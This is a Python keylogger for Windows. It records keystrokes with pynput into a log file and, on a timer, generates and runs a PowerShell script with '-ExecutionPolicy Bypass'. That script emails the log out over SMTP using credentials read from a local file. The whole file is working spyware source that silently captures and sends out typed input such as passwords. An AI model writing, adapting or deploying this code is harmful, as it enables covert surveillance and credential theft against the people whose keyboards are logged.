import pynput
from pynput.keyboard import Key, Listener
import os
import sys
import time
import subprocess
import threading
import re
from colorama import Fore, Style, init
init(autoreset=True)


file = "logger.txt"

def writeFile(fl, data):
    if not os.path.exists(f"{os.path.dirname(__file__)}\\{fl}"):
        open(f"{os.path.dirname(__file__)}\\{fl}", "w+").close()
    with open(f"{os.path.dirname(__file__)}\\{fl}", "a") as f:
        f.write(data)

def waitDelay():
    global delay
    timer = threading.Timer(float(delay)*60, SendEmail)
    timer.start()


def PrepMail():
    global delay
    dir_ps1 = f"{os.path.dirname(__file__)}"
    with open(f"{dir_ps1}\\CREDS.txt", "r") as f:
        creds_list = f.readlines()
        for i in range(0, len(creds_list)):
            creds_list[i] = creds_list[i].split(":")[1].replace("\n", "")
        email, password, smtp, delay = creds_list
    with open(f"{dir_ps1}\\mail.ps1", "w") as f:
        cmd = '''$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("{0}", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("{1}", "{2}");
$smtp.EnableSsl = $true
$smtp.Timeout = 400000
$Message.From = "{3}"
$Message.To.Add("{4}")
$Message.Attachments.Add("{5}")
$smtp.Send($Message)'''.format(smtp, email, password, email, email, f"{os.path.dirname(__file__)}\\{file}")
        f.write(cmd)

def SendEmail():
    dir_ps1 = f"{os.path.dirname(__file__)}"
    os.chdir(dir_ps1)
    ps_path = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe '
    os.chdir(dir_ps1)
    os.system(ps_path + "-ExecutionPolicy Bypass -File mail.ps1")
    print("Sending Mail...")
    waitDelay()

class logging():

    def chooseList(self):
        with open(f"{os.path.dirname(__file__)}\\useList.txt", "r") as cl:
            unwanted = cl.read(28)
            cl.seek(0)
            listType = cl.read(37).replace(unwanted, "")
            self.listType = listType
            return listType

    def PrepWhitelist(self, linestoignore):
        with open(f"{os.path.dirname(__file__)}\\whitelist.txt", "r") as w:
            whitelist = w.readlines()
            for i in range(0, len(whitelist)-1):
                if i < linestoignore:
                    i = 0
                    whitelist.pop(i)
            for i in whitelist:
                whitelist[whitelist.index(i)] = whitelist[whitelist.index(i)].replace("\n", "")
            self.whitelist = whitelist


    def PrepBlacklist(self, linestoignore):
        with open(f"{os.path.dirname(__file__)}\\blacklist.txt", "r") as b:
            blacklist = b.readlines()
            for i in range(0, len(blacklist)-1):
                if i < linestoignore:
                    i = 0
                    blacklist.pop(i)
            for i in blacklist:
                blacklist[blacklist.index(i)] = blacklist[blacklist.index(i)].replace("\n", "")
            self.blacklist = blacklist


    def on_pressbl(self, key):
        key = str(key).replace("'", "")
        if key not in self.blacklist:
            if re.match("[a-zA-Z]", key) == False or "." in key:
                key = str(key).replace("'", "").replace("[", "").replace("]", "")
                data = f"[{key}]"
            else:
                data = key
            writeFile(file, data)


    def on_presswl(self, key):
        key = str(key).replace("'", "")
        if key in self.whitelist:
            if re.match("[a-zA-Z]", key) == False or "." in key:
                key = str(key).replace("'", "").replace("[", "").replace("]", "")
                data = f"[{key}]"
            else:
                data = key
            writeFile(file, data)

    def on_release(self, key):
        pass

logobj = logging()
PrepMail()
waitDelay()
logobj.PrepWhitelist(2)
logobj.PrepBlacklist(2)

if logobj.chooseList() == "blacklist":
    with Listener(on_press=logobj.on_pressbl, on_release=logobj.on_release) as listener:
        listener.join()
if logobj.chooseList() == "whitelist":
    with Listener(on_press=logobj.on_presswl, on_release=logobj.on_release) as listener:
        listener.join()
else:
    print(Fore.RED + Style.BRIGHT + 'PLEASE SELECT A VALID LIST-TYPE IN "useList.txt"')
    time.sleep(3)
    sys.exit()
    exit()
